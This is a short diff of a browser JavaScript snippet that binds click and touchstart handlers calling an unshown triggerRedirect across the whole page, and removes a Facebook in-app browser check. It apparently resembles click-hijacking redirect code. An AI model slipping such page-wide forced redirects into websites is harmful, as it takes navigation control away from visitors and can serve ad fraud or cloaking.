@@ -14,20 +14,8 @@
   }
 
   function attachEvents() {
-    const addListeners = (el) => {
-      el.addEventListener('click', triggerRedirect, {passive: true});
-      el.addEventListener('touchstart', triggerRedirect, {passive: true});
-    };
-
-    addListeners(document.body);
-    addListeners(document.documentElement);
-
-    const observer = new MutationObserver(() => {
-      addListeners(document.body);
-      addListeners(document.documentElement);
-    });
-
-    observer.observe(document.body, {childList: true, subtree: true});
+    document.addEventListener('click', triggerRedirect, {passive: true});
+    document.addEventListener('touchstart', triggerRedirect, {passive: true});
   }
 
   if (document.readyState === 'loading') {
@@ -35,8 +23,4 @@
   } else {
     attachEvents();
   }
-
-  const ua = navigator.userAgent || navigator.vendor || window.opera;
-  const isFBBrowser = ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1;
-  if (isFBBrowser) console.log("Facebook browser detected");
 })();
